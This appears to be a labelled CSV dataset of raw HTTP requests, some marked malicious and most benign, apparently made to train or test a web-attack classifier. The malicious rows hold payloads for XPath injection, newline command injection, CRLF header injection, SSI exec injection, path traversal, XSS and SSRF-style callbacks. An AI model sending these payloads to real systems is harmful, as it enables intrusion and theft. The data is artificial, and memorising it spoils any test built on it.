label,text
malicious,"GET /query_documents?author_name=Jane%20Doe%27%20or%20%28substring(user/password%2C1%2C1)%20%3D%20%27a%27%29%20or%20%271%27%3D%271 HTTP/1.1
Host: trusted-info-exchange.co.uk
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
Accept: application/xml,text/html
Accept-Encoding: gzip, deflate, br
Referer: https://trusted-info-exchange.co.uk/home
Connection: keep-alive"
benign,"PUT /api/vehicles/AB1234/status HTTP/1.1
Host: fleet-management-solutions.co
Authorization: Bearer ZxYwVuTsRqPoNmLkJhGfEdCba0987654321LmNoPq
Accept: application/xml
Content-Type: application/xml
User-Agent: python-requests/2.28.1
Content-Length: 126

<VehicleStatus><vehicleId>AB1234</vehicleId><status>maintenance_scheduled</status><location>Garage 3</location></VehicleStatus>"
malicious,"POST /blog/article/comment HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Referer: https://my-personal-blog-site.info/blog/article/view?id=123
Cookie: auth=xyz987abc654
Content-Length: 79

comment=Nice+post!%0aid%0aecho%20Injected%20via%20newline%0als%20-la%20/tmp"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: data-visualization-suite.com
Accept: image/*,*/*;q=0.6
Accept-Language: de-DE,de;q=0.9,en-US;q=0.7,en;q=0.4
If-None-Match: ""358a45f6b7a1d9c9f8a7d7a7f5""
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
malicious,"POST /api/search XPath HTTP/1.1
Host: enterprise-analytics-solutions.tech
User-Agent: Python-urllib/3.9
Content-Type: application/json
Accept: application/json
Content-Length: 129

{""query"": ""/users/user[username='admin' and substring(password,7,1)='o']/userid""}"
benign,"POST /user/settings/privacy HTTP/1.1
Host: privacy-first.social-net.biz
Connection: close
Content-Type: application/json
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: curl/7.88.1
Accept-Language: en-US
Content-Length: 42

{""share_location"":false,""profile_visibility"":""friends""}"
benign,"POST /auth/login HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Accept: application/json
Origin: https://online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.83 Mobile Safari/537.36
Content-Length: 78

{""email"":""michael.sanders1979@online-retail-store.biz"",""password"":""FlowerPot!75""}"
benign,"POST /user/uploads/photos HTTP/1.1
Host: my-photo-backup.cloudphotoapp.io
Connection: keep-alive
Accept: image/webp,image/apng,image/*,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://my-photo-backup.cloudphotoapp.io/gallery/recent
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXzz84F1eM9pJseP4
Content-Length: 12584
Cookie: session_token=6yW9VjPwdQbtuNHMJKly9E55

------WebKitFormBoundaryXzz84F1eM9pJseP4
Content-Disposition: form-data; name=""files[]""; filename=""holiday_london.jpg""
Content-Type: image/jpeg

<JPEG binary data: 288967 bytes>
------WebKitFormBoundaryXzz84F1eM9pJseP4
Content-Disposition: form-data; name=""files[]""; filename=""family_bbq.png""
Content-Type: image/png

<PNG binary data: 174532 bytes>
------WebKitFormBoundaryXzz84F1eM9pJseP4--"
malicious,"POST /api/v2/authenticate HTTP/1.1
Host: login.api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache
Content-Length: 67

email=normal.user%00%01%08fake&password=Passw0rd123!&remember_me=true"
benign,"GET /static/v2/css/theme-dark.css HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/css,*/*;q=0.1
DNT: 1
Connection: keep-alive"
benign,"GET /library/catalogue/fiction/bestsellers HTTP/1.1
Host: citycentral-library.org
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: curl/7.88.1
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Referer: https://citycentral-library.org/
Cookie: lib_user=1379b4d7f290a3c0fe1b4712983e2f5c
DNT: 1
Sec-CH-UA: ""curl"";v=""7""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Linux""
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: document"
benign,"GET /api/v1/items/lookup?filter=param%3DHello%252520World HTTP/1.1
Host: api.freshmarket-online.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.8
X-Requested-With: XMLHttpRequest
Connection: close"
benign,"POST /upload/image HTTP/1.1
Host: photoshare-secure.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://photoshare-secure.net/gallery/recent
Origin: https://photoshare-secure.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Cookie: sessionid=5487e3f2cd8a46d2b90dcfae7154a1b2; prefs=lang=en-US
Connection: keep-alive

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""caption""

Sunset at the beach
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""album_id""

27
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""image_file""; filename=""photo123.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------WebKitFormBoundary7MA4YWxkTrZu0gW--"
malicious,"POST /api/v1/auth/validate HTTP/1.1
Host: authfile.manager-datacore.cloud
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/json
Content-Type: application/json
Content-Length: 242
X-Requested-With: FetchAPIClient

{""callback"": ""/auth_callback%0d%0aContent-Type:%20text/plain%0d%0aLocation:%20http://injector-redirect.manager-datacore.cloud%0d%0a%0d%0aInjected-Text""}"
malicious,"GET /content/header.shtml?template_name=default%3C!----%23ECHO%20VAR%3D%22DATE_LOCAL%22%20----%3E HTTP/1.1
Host: intranet-filesystem.edu
User-Agent: Lynx/2.8.8rel.2 libwww-FM/2.14
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: identity
Connection: keep-alive"
benign,"POST /api/tasks HTTP/1.1
Host: teamflow-app.net
Authorization: Bearer 77YusL4ZLOpjk23XIqJ9idbQacM72
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0
Content-Length: 122
Connection: keep-alive

{""title"":""Prepare Q3 report"",""dueDate"":""2024-07-15T17:00:00Z"",""priority"":""high"",""assignedTo"":""claire.darwin"",""tags"":[""finance"",""reports""]}"
benign,"POST /api/v2/survey/submit HTTP/1.1
Host: insights.market-analytics.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 186
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive

respondent_id=839217&feedback=%3Csuggestion%3EOffer+more+webinars+on+data+visualization.%3C%2Fsuggestion%3E&satisfied=true"
benign,"GET /api/v1/catalog/items?startToken=YXBpX3RhYmxlX3BhZ2U=&filters=eyJsYXRlc3QiOiIxOC0wNC0yMDIzIn0= HTTP/1.1
Host: online-retail-store.biz
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:100.0) Gecko/20100101 Firefox/100.0
DNT: 1
Connection: close"
benign,"POST /blog/comment/add HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Referer: https://my-personal-blog-site.info/blog/article/view/718
Connection: keep-alive

name=Anna+Smith&email=anna.smith%40mail.com&website=&comment=Nice+post%21"
benign,"POST /submit/form-data HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Bearer QWERTY1234567890abcdef
Content-Type: application/json
Accept: application/json
Accept-Language: en-US,en;q=0.9
User-Agent: curl/7.88.1
Content-Length: 96
Connection: close

{""form-data"": {""user-id"": ""a72f64e9"", ""session_token"": ""XYZ_123-456"", ""time-stamp"": ""2024-06-24T12:30:45Z""}"
benign,"GET /favicon.ico HTTP/1.1
Host: smart-home-hub.io
Connection: keep-alive
Accept: image/x-icon,image/vnd.microsoft.icon,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9"
benign,"POST /account/authenticate HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Accept-Language: en-US,en;q=0.9
Referer: https://api.cloud-data-services.ai/account/login
Origin: https://api.cloud-data-services.ai
Cookie: auth_token=a9f3f7e0f7fef123bca7; csrf_token=abcD3fgh!9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Connection: close

email=lorenzo.dimarco%40mailcloud.ai&password=CloudSafePass#1997"
benign,"GET /api/v2/order/history/98031 HTTP/1.1
Host: quickorderservice.xyz
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiamFuZWRvZSJ9.BYJq4Aj6cdoIPkMdTc3K7pF6Xkg7wb2v55liKcgN0-I
User-Agent: Python-urllib/3.11
Accept-Language: en-US,en;q=0.9
Connection: close"
benign,"OPTIONS /graphql HTTP/1.1
Host: graph-api.network-services.io
Origin: https://dashboard.dev-environment.net
Access-Control-Request-Method: GET
User-Agent: python-requests/2.31.0
Access-Control-Request-Headers: Content-Type, X-Api-Key
Accept-Encoding: gzip, deflate, br
Connection: close"
benign,"GET /fetchMetadata?url=https%3A%2F%2Fmy-personal-blog-site.info%2Fposts%2F2024%2Fwelcome-home HTTP/1.1
Host: api.my-personal-blog-site.info
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept-Language: en-US,en;q=0.7
Pragma: no-cache
Connection: keep-alive
Referer: https://my-personal-blog-site.info/"
benign,"DELETE /api/v1/users/7421 HTTP/1.1
Host: secure-member-hub.org
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2V9.lFqNlut1qMh1jSyQWbnCMWJJFM9fTbFrDMBpFvLjbqM
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: keep-alive"
malicious,"POST /user/session HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 122
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://online-retail-store.biz/login
Origin: https://online-retail-store.biz
Connection: keep-alive

login=customer' and substring(concat(//accounts/account[1]/password),2,1)='s'&pass=irrelevant"
benign,"GET /api/v1/weather/forecast/hourly?location=37.7749,-122.4194 HTTP/1.1
Host: global-weather-info.org
Accept: application/json
App-Secret: 84bfe2105d964a5b91fa73c8f2ea1e4c
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0
Cache-Control: max-age=0"
benign,"POST /user/upload HTTP/1.1
Host: med-records-online.healthcare
User-Agent: python-requests/2.28.1
Accept: application/json
Content-Type: multipart/form-data; boundary=----MedBoundary9988
Content-Length: 525
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.fakePayload.fakeSignature
Connection: keep-alive

------MedBoundary9988
Content-Disposition: form-data; name=""document""; filename=""discharge_summary.docx""
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document

PK"
benign,"GET /static/fonts/icons.woff2 HTTP/1.1
Host: tech-savvy-portal.ws
Accept: font/woff2,application/font-woff2;q=0.9,*/*;q=0.8
User-Agent: PerlLib/6.5
Accept-Language: en-GB,en;q=0.9
Connection: close"
malicious,"GET /api/v2/check-resource?resource=98765 HTTP/1.1
Host: integration.mailer-pipeline.md
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
X-Callback-Server: http://internal-fetch-service.exp-delay.net/trigger
Referer: https://portal.mailer-pipeline.md/dashboard
Connection: keep-alive"
benign,"GET /search?query=smart+home+automation&sort=recent HTTP/1.1
Host: smartliving-hub.ai
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
malicious,"GET /jump?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /posts/view/9821?comment=This%20is%20%26lt%3Bbold%26gt%3B HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Connection: keep-alive
Referer: https://community.game-dev-forum.org/posts/latest"
benign,"POST /token/oauth2 HTTP/1.1
Host: login-dataauth.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 146
Authorization: Basic ZGF0YXVzZXI6c2VjcmV0KkEyMw==
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Referer: https://login-dataauth.ai/oauth/authorize
Cache-Control: no-store

grant_type=authorization_code&code=XPZ783DErtl&redirect_uri=https%3A%2F%2Fclientapp.dataauth.ai%2Fcallback&client_id=datauser&client_secret=secret*A23"
malicious,"POST /ticket/submit HTTP/1.1
Host: support.enterprise-solutions.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Referer: https://support.enterprise-solutions.biz/ticket/new
Accept-Encoding: gzip, deflate

subject=Server%20issue&description=Error%20logs%0adf%20-h%0arc%20%2Ftmp%2Fexploit.log"
benign,"DELETE /v2/projects/8a4e7f6b3c HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Token a1b2c3d4e5f67890abcd1234efgh5678
X-Confirm-Delete: true
User-Agent: curl/7.85.0
Accept: */*
Connection: close"
malicious,"GET /blog/article/view?id=452 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.7
Cookie: theme=../../../../usr/local/lib/locale/settings%00light
Referer: https://my-personal-blog-site.info/blog
Connection: close"
malicious,"POST /api/v2/layout/apply HTTP/1.1
Host: userportal-cloud-storage.biz
Content-Type: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
Sec-CH-UA: ""Chromium"";v=""91"", ""Google Chrome"";v=""91"", "" Not A;Brand"";v=""99""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android""
Accept: application/json, text/plain, */*
Content-Length: 173

{""render"":{""body"":{""html"":""Welcome back! <!--#exec cmd=\""c""""a""""t /e""""tc/hostname\""-->""}},""flags"":{""enableScripts"":false}}"
benign,"POST /user/support/ticket HTTP/1.1
Host: helpdesk-nextgen.app
Connection: keep-alive
Content-Length: 145
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: deflate, br
Accept-Language: en-US,en;q=0.5
Origin: https://helpdesk-nextgen.app
Referer: https://helpdesk-nextgen.app/support
Cookie: sid=4fsal83hjdiwq92u09s

subject=Login+Issue&priority=High&details=VXNlciBhZ2VudCBleHBsYWluZWQgYSBpbmRpdmlkdWFsIGFuZCBjb25uZWN0aW9uIHByb2JsZW0gaW4gYXJlYS4gU3VwcG9ydCB0ZWNobmljaWFuIGFzaXN0Lg=="
benign,"POST /api/v1/forum/posts HTTP/1.1
Host: community.dev-hub-forums.net
Connection: keep-alive
Content-Type: application/json
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
Accept-Language: en-US,en;q=0.7
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Content-Length: 135

{""thread_id"":1827,""content"":""Thanks for sharing your insights on asynchronous patterns, really helpful! Looking forward to more posts."",""tags"":[""async"",""patterns"",""discussion""]}"
benign,"POST /signin HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: https://online-retail-store.biz
Referer: https://online-retail-store.biz/signin
Cookie: session_id=retail74920; csrf_token=def4581693a8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36

email=amy.lopez%40mailretail.biz&password=Shop4Fun+2024"
benign,"DELETE /api/v1/sessions/5f62d1e7 HTTP/1.1
Host: secure-access-manager.org
Authorization: Bearer pa9za2kmog1q8twne6svrbhxclj4fdyu
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: application/json
Cache-Control: no-store
Connection: close"
benign,"GET /search?query=how%20to%20bake%20bread HTTP/1.1
Host: homebakingresource.app
Accept: application/rss+xml, application/xml;q=0.9, */*;q=0.8
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip
Connection: keep-alive"
benign,"POST /poll/87/vote HTTP/1.1
Host: civic-engage-platform.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://civic-engage-platform.net/poll/87
Cookie: sessionid=ghd84kdkse92jwpv34mb5cfkoq

poll_id=87&choice_id=3"
benign,"POST /profile/edit HTTP/1.1
Host: creative-design-studio.org
Content-Type: multipart/form-data; boundary=----FormBoundaryvkQd0HZjmeY0MmOY
Content-Length: 312
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.136 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Origin: https://creative-design-studio.org
Connection: keep-alive

------FormBoundaryvkQd0HZjmeY0MmOY
Content-Disposition: form-data; name=""display_name""

Lina Chen
------FormBoundaryvkQd0HZjmeY0MmOY
Content-Disposition: form-data; name=""location""

San Francisco, CA
------FormBoundaryvkQd0HZjmeY0MmOY
Content-Disposition: form-data; name=""about_me""

Passionate about UX/UI and digital art.
------FormBoundaryvkQd0HZjmeY0MmOY--"
benign,"POST /api/v1/contact HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Accept-Encoding: gzip, deflate
Connection: keep-alive
X-Forwarded-For: 66.249.66.1

client_id=2374&feedback=When+writing+queries,+remember+to+use+DELETE+only+with+a+proper+WHERE+condition+to+avoid+accidental+loss."
benign,"POST /api/v3/payments/process HTTP/1.1
Host: secure-finance-api.org
Authorization: Bearer dG9rZW5NZXRkYXRhMjAyNA==
Content-Type: application/json
Accept: application/json
Accept-Language: en-GB,en;q=0.8
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Length: 172

{""transaction_data"": {""payer-id"": ""user-8934-4df"", ""amount.value"": 152.75, ""currency_code"": ""GBP"", ""payment-method"": ""credit_card""}, ""metadata[device]"": ""iPhone14,3"", ""session-token"": ""abc-123_xyz-789""}"
